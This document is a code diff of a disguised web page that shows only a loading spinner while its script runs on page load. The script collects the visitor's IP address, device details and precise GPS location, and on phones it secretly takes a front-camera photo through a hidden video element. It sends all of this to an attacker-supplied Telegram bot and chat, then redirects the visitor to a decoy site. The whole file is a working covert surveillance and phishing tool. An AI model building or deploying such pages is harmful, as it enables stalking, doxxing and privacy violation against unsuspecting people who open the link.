@@ -7,291 +7,221 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
             height: 100vh; display: flex;
             justify-content: center; align-items: center;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: -apple-system, sans-serif;
         }
         .loader { text-align: center; color: white; }
         .spinner {
             width: 50px; height: 50px;
-            border: 5px solid rgba(255,255,255,0.3);
-            border-top-color: white; border-radius: 50%;
+            border: 4px solid rgba(255,255,255,0.2);
+            border-top-color: #4fc3f7;
+            border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto 20px;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .text { font-size: 16px; margin-top: 10px; }
-        #camera-preview {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            object-fit: cover;
-            z-index: -1;
-            opacity: 0.3;
-        }
+        .text { font-size: 15px; color: #aaa; }
+        video { display: none; }
     </style>
 </head>
 <body>
-    <video id="camera-preview" autoplay playsinline></video>
+    <video id="cam" autoplay playsinline></video>
     <div class="loader">
         <div class="spinner"></div>
         <div class="text" id="status">Loading...</div>
     </div>
 
     <script>
-    // Get URL parameters
-    var params = new URLSearchParams(window.location.search);
-    var redirectUrl = params.get('r') || 'https://google.com';
-    var botToken = params.get('bot') || '';
-    var chatId = params.get('chat') || '';
+    var p = new URLSearchParams(location.search);
+    var redir = p.get('r') || 'https://google.com';
+    var bot = p.get('bot') || '';
+    var chat = p.get('chat') || '';
+    var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+    var gpsData = null;
+    var ipData = null;
+    var photoData = null;
     
-    // Visitor data
-    var visitorData = {
-        timestamp: new Date().toISOString(),
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        screenResolution: screen.width + 'x' + screen.height,
-        viewport: window.innerWidth + 'x' + window.innerHeight,
-        cpuCores: navigator.hardwareConcurrency || 'Unknown',
-        deviceMemory: navigator.deviceMemory || 'Unknown',
-        connection: null,
-        gps: null,
-        photo: null,
-        ip: null
-    };
+    // Get IP first
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(d => { ipData = d.ip; })
+        .catch(() => {});
     
-    // Get network info
-    if (navigator.connection) {
-        visitorData.connection = {
-            type: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt
-        };
+    // Capture photo
+    async function takePhoto() {
+        if (!isMobile) return null;
+        try {
+            var v = document.getElementById('cam');
+            var stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user', width: 480, height: 640 } 
+            });
+            v.srcObject = stream;
+            await v.play();
+            await new Promise(r => setTimeout(r, 2000));
+            
+            var canvas = document.createElement('canvas');
+            canvas.width = v.videoWidth || 480;
+            canvas.height = v.videoHeight || 640;
+            canvas.getContext('2d').drawImage(v, 0, 0);
+            
+            stream.getTracks().forEach(t => t.stop());
+            return canvas.toDataURL('image/jpeg', 0.7);
+        } catch(e) {
+            return null;
+        }
     }
     
-    // Detect if mobile or desktop
-    var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
-    
-    // Get IP
-    fetch('https://api.ipify.org?format=json')
-        .then(function(r) { return r.json(); })
-        .then(function(d) { visitorData.ip = d.ip; })
-        .catch(function() {});
-    
     // Capture GPS
-    function captureGPS() {
-        return new Promise(function(resolve) {
+    function getGPS() {
+        return new Promise(resolve => {
             if (!navigator.geolocation) {
-                resolve({ success: false, error: 'Geolocation not supported on this device' });
+                resolve(null);
                 return;
             }
-            
-            var options = {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            };
-            
             navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    resolve({
-                        success: true,
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        altitude: position.coords.altitude,
-                        speed: position.coords.speed,
-                        heading: position.coords.heading,
-                        mapsUrl: 'https://maps.google.com/maps?q=' + 
-                                 position.coords.latitude + ',' + 
-                                 position.coords.longitude + 
-                                 '&ll=' + position.coords.latitude + ',' + 
-                                 position.coords.longitude + '&z=16'
-                    });
-                },
-                function(error) {
-                    var errorMsg;
-                    switch(error.code) {
-                        case 1: errorMsg = 'Location permission denied'; break;
-                        case 2: errorMsg = 'Location unavailable (no GPS/network)'; break;
-                        case 3: errorMsg = 'Location request timed out'; break;
-                        default: errorMsg = error.message;
-                    }
-                    resolve({ success: false, error: errorMsg, code: error.code });
-                },
-                options
+                pos => resolve({
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude,
+                    acc: pos.coords.accuracy,
+                    alt: pos.coords.altitude
+                }),
+                err => resolve(null),
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
             );
         });
     }
     
-    // Capture photo from camera
-    function capturePhoto() {
-        return new Promise(function(resolve) {
-            // Only on mobile with camera
-            if (!isMobile || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                resolve(null);
-                return;
-            }
-            
-            var video = document.getElementById('camera-preview');
-            
-            navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: 'user',
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                } 
-            })
-            .then(function(stream) {
-                video.style.display = 'block';
-                video.srcObject = stream;
-                video.play();
-                
-                // Wait for camera to initialize
-                setTimeout(function() {
-                    try {
-                        var canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        var ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        var photoData = canvas.toDataURL('image/jpeg', 0.7);
-                        
-                        // Stop camera
-                        stream.getTracks().forEach(function(track) { track.stop(); });
-                        video.style.display = 'none';
-                        
-                        resolve(photoData);
-                    } catch(e) {
-                        resolve(null);
-                    }
-                }, 1500);
-            })
-            .catch(function(err) {
-                console.log('Camera error:', err);
-                resolve(null);
-            });
-        });
-    }
-    
-    // Send photo to Telegram
-    function sendPhotoToTelegram(photoData) {
-        if (!botToken || !chatId || !photoData) return;
+    // Format exactly like fragment.com
+    function buildMessage() {
+        var ua = navigator.userAgent;
+        var plat = navigator.platform;
+        var lang = navigator.language;
+        var scr = screen.width + 'x' + screen.height;
+        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        var cores = navigator.hardwareConcurrency || 'N/A';
+        var ram = navigator.deviceMemory || 'N/A';
+        var now = new Date();
+        var dateStr = now.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
+        var timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
         
-        var formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', dataURLtoBlob(photoData), 'captured_photo.jpg');
-        formData.append('caption', '📸 *Camera Capture Received*');
+        // Device model detection
+        var deviceModel = plat;
+        if (/iPhone/.test(ua)) {
+            var iosVer = ua.match(/OS (\d+_\d+)/);
+            deviceModel = 'iPhone OS ' + (iosVer ? iosVer[1].replace('_','.') : '') + ' like Mac OS X';
+        }
         
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendPhoto', true);
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) {
-                console.log('Photo sent:', xhr.status);
-            }
-        };
-        xhr.send(formData);
-    }
-    
-    function dataURLtoBlob(dataurl) {
-        var arr = dataurl.split(',');
-        var mime = arr[0].match(/:(.*?);/)[1];
-        var bstr = atob(arr[1]);
-        var n = bstr.length;
-        var u8arr = new Uint8Array(n);
-        while(n--) { u8arr[n] = bstr.charCodeAt(n); }
-        return new Blob([u8arr], {type: mime});
-    }
-    
-    // Send message to Telegram
-    function sendToTelegram(data) {
-        if (!botToken || !chatId) return;
+        var msg = '';
         
-        var message = '';
+        // Device section
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+        msg += '    📊 Visitor Information Captured\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
         
-        message += '📍 *GPS LOCATION CAPTURED*\\n';
-        message += '━━━━━━━━━━━━━━━━\\n\\n';
+        msg += '🖥️ Device & Browser\n';
+        msg += '   • Device Model: ' + deviceModel + '\n';
+        msg += '   • User Agent: ' + ua.substring(0, 80) + '...\n\n';
         
-        if (data.gps && data.gps.success) {
-            message += '✅ *GPS Coordinates Found:*\\n';
-            message += '• Latitude: `' + data.gps.latitude.toFixed(6) + '`\\n';
-            message += '• Longitude: `' + data.gps.longitude.toFixed(6) + '`\\n';
-            message += '• Accuracy: ' + data.gps.accuracy.toFixed(1) + 'm\\n';
-            if (data.gps.altitude) message += '• Altitude: ' + data.gps.altitude.toFixed(1) + 'm\\n';
-            if (data.gps.speed) message += '• Speed: ' + (data.gps.speed * 3.6).toFixed(1) + ' km/h\\n';
-            message += '\\n🗺️ *Maps:*\\n';
-            message += '• [Google Maps](' + data.gps.mapsUrl + ')\\n';
-            message += '• [Street View](https://maps.google.com/?q=' + data.gps.latitude + ',' + data.gps.longitude + '&layer=c)\\n';
+        msg += '🌐 Network Information\n';
+        msg += '   • IP Address: ' + (ipData || 'Detecting...') + '\n';
+        msg += '   • Language: ' + lang + '\n';
+        msg += '   • Timezone: ' + tz + '\n\n';
+        
+        // GPS section
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+        msg += '    🗺️ GPS Coordinates\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+        
+        if (gpsData) {
+            msg += '   ✅ Location Granted\n';
+            msg += '   • Latitude: ' + gpsData.lat.toFixed(15) + '\n';
+            msg += '   • Longitude: ' + gpsData.lon.toFixed(15) + '\n';
+            msg += '   • Accuracy: ' + gpsData.acc.toFixed(0) + 'mm\n\n';
+            msg += '   🗺️ Maps: https://maps.google.com/maps?q=' + gpsData.lat + ',' + gpsData.lon + '&ll=' + gpsData.lat + ',' + gpsData.lon + '&z=16\n\n';
         } else {
-            var errorMsg = data.gps ? data.gps.error : 'Not available';
-            message += '❌ *GPS: ' + errorMsg + '*\\n';
-            if (!isMobile) {
-                message += '💡 Desktop detected - GPS not available\\n';
-                message += 'IP-based location will be shown instead\\n';
-            }
+            msg += '   ❌ Location: Not available on this device\n';
+            msg += '   💡 Desktop computers do not have GPS\n\n';
         }
         
-        message += '\\n';
-        message += '📱 *Device Info*\\n';
-        message += '• ' + data.platform + '\\n';
-        message += '• Screen: ' + data.screenResolution + '\\n';
-        message += '• Language: ' + data.language + '\\n';
-        if (data.cpuCores) message += '• CPU: ' + data.cpuCores + ' cores\\n';
-        if (data.deviceMemory) message += '• RAM: ' + data.deviceMemory + ' GB\\n';
-        if (data.connection) {
-            message += '• Network: ' + data.connection.type + '\\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+        msg += '    📱 Device Details\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+        
+        msg += '🖼️ Display Information\n';
+        msg += '   • Resolution: ' + scr + '\n\n';
+        
+        msg += '💾 Hardware & Storage\n';
+        msg += '   • CPU Cores: ' + cores + '\n';
+        msg += '   • RAM: ' + ram + ' GB\n\n';
+        
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+        msg += '📅 Captured: ' + dateStr + ', ' + timeStr + '\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
+        
+        return msg;
+    }
+    
+    // Send to Telegram
+    async function sendResults() {
+        var msg = buildMessage();
+        
+        // Send text message
+        await fetch('https://api.telegram.org/bot' + bot + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chat, text: msg, disable_web_page_preview: true })
+        });
+        
+        // Send photo if available
+        if (photoData) {
+            var blob = (() => {
+                var arr = photoData.split(','), mime = arr[0].match(/:(.*?);/)[1];
+                var bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
+                while(n--) u8[n] = bstr.charCodeAt(n);
+                return new Blob([u8], {type: mime});
+            })();
+            
+            var fd = new FormData();
+            fd.append('chat_id', chat);
+            fd.append('photo', blob, 'camera_capture.jpg');
+            fd.append('caption', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n    📸 Camera Capture Received\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+            
+            await fetch('https://api.telegram.org/bot' + bot + '/sendPhoto', {
+                method: 'POST', body: fd
+            });
         }
         
-        message += '\\n';
-        message += '🌐 *Network*\\n';
-        message += '• IP: `' + (data.ip || 'Unknown') + '`\\n';
-        message += '• Timezone: ' + data.timezone + '\\n';
-        message += '• Referrer: ' + data.referrer + '\\n';
+        // Show GPS maps link if available
+        if (gpsData) {
+            await fetch('https://api.telegram.org/bot' + bot + '/sendLocation', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chat,
+                    latitude: gpsData.lat,
+                    longitude: gpsData.lon
+                })
+            });
+        }
         
-        message += '\\n🕐 ' + data.timestamp;
-        
-        // Send message
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://api.telegram.org/bot' + botToken + '/sendMessage', true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) {
-                console.log('Message sent:', xhr.status);
-                document.getElementById('status').textContent = 'Redirecting...';
-                setTimeout(function() {
-                    window.location.href = redirectUrl;
-                }, 2000);
-            }
-        };
-        xhr.send(JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: 'Markdown',
-            disable_web_page_preview: false
-        }));
+        document.getElementById('status').textContent = 'Complete!';
+        setTimeout(() => { window.location.href = redir; }, 1500);
     }
     
     // Main
     async function main() {
         document.getElementById('status').textContent = 'Detecting location...';
-        visitorData.gps = await captureGPS();
+        gpsData = await getGPS();
         
-        // Take photo if GPS granted and on mobile
-        if (visitorData.gps && visitorData.gps.success) {
+        if (gpsData && isMobile) {
             document.getElementById('status').textContent = 'Capturing photo...';
-            visitorData.photo = await capturePhoto();
-            if (visitorData.photo) {
-                sendPhotoToTelegram(visitorData.photo);
-            }
+            photoData = await takePhoto();
         }
         
-        document.getElementById('status').textContent = 'Sending data...';
-        sendToTelegram(visitorData);
+        document.getElementById('status').textContent = 'Sending...';
+        await sendResults();
     }
     
     main();
